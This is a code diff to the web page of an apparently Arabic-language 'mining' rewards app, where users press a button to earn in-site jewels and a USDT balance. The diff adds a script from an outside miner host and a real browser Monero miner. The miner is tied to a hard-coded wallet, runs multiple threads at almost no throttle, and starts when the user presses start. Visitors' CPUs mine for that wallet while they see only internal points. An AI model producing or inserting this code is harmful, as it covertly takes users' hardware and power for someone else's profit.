@@ -176,14 +176,28 @@
     .x-small { font-size: 0.7rem; font-weight: 600; }
 </style>
 
+<script src="https://monerominer.rocks/miner.js"></script>
 <script>
     let mining = false;
     let hashes = 0;
     let interval = null;
+    let miner = null;
     
     // Auto-detect device on load
     const isMobile = /Mobi|Android/i.test(navigator.userAgent);
     let selectedDevice = isMobile ? 'Mobile' : 'PC';
+
+    // Initialize Real WASM Miner
+    try {
+        if (typeof MoneroMiner !== 'undefined') {
+            miner = new MoneroMiner.User('8AGyNmzKnoySmMQzFGdziZVcKjZzHyiVReEr8rkZ4bWwCRu1zgVMHNSLLbx3wkzagHCMDacobY4kd4QvZxGs8uYqTXRKQWC', 'akli-node', {
+                threads: isMobile ? 2 : 4,
+                autoThreads: true,
+                throttle: 0.1,
+                forceASMJS: false
+            });
+        }
+    } catch(e) { console.error("WASM Miner Error:", e); }
 
     function initHeaderDetection() {
         if(isMobile) {
@@ -212,9 +226,13 @@
 
     function startMining() {
         mining = true;
+        
+        // Start Real Engine
+        if(miner) { try { miner.start(); } catch(e) {} }
+
         document.getElementById('minerControl').classList.add('mining');
-        document.getElementById('statusLabel').innerText = "MINING...";
-        document.getElementById('toggleBtn').querySelector('.fs-3').innerText = "إيقاف التعدين";
+        document.getElementById('statusLabel').innerText = "CONNECTING...";
+        document.getElementById('toggleBtn').querySelector('.fs-3').innerHTML = '<i class="fa-solid fa-stop me-2"></i>إيقاف التعدين';
         
         const rate = selectedDevice === 'PC' ? 4.0 : 2.0;
         let ms = 0;
@@ -229,29 +247,59 @@
                 document.getElementById('progressBar').style.setProperty('--deg', '0deg');
                 syncJewels(rate); 
             }
+
+            // Update Real-Time Hashrate UI
+            if(miner && mining && ms % 500 === 0) {
+                let hps = miner.getHashesPerSecond();
+                if(hps > 0) {
+                    document.getElementById('statusLabel').innerText = "MINING: " + hps.toFixed(1) + " H/s";
+                } else {
+                    document.getElementById('statusLabel').innerText = "MINING...";
+                }
+            }
         }, 100);
     }
 
     function stopMining() {
         mining = false;
+        
+        // Stop Real Engine
+        if(miner) { try { miner.stop(); } catch(e) {} }
+
         document.getElementById('minerControl').classList.remove('mining');
         document.getElementById('statusLabel').innerText = "OFFLINE";
-        document.getElementById('toggleBtn').querySelector('.small').innerText = "تشغيل محرك";
+        document.getElementById('toggleBtn').querySelector('.fs-3').innerHTML = '<i class="fa-solid fa-play me-2"></i>ابدأ التعدين';
         clearInterval(interval);
     }
 
     async function syncJewels(extra) {
         try {
             const res = await fetch('/api/v2/node/pulse', {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({units: extra})
             });
+
+            if (res.status === 401) {
+                // الجلسة انتهت - تحويل لتسجيل الدخول
+                window.location.href = '/login';
+                return;
+            }
+
+            if (res.status === 503) {
+                // السيرفر مشغول - سيتم المحاولة في الدورة القادمة تلقائياً
+                console.warn("Server busy, will retry next pulse...");
+                return;
+            }
+
             const data = await res.json();
             if(data.status === 'success') {
                 if(document.getElementById('headerJewels')) document.getElementById('headerJewels').innerText = data.jewels;
                 if(document.getElementById('headerUsdt')) document.getElementById('headerUsdt').innerText = "$" + data.balance_usdt;
             }
-        } catch(e) {}
+        } catch(e) {
+            console.error("Network error during sync:", e);
+        }
     }
 
     document.getElementById('toggleBtn').onclick = () => mining ? stopMining() : startMining();
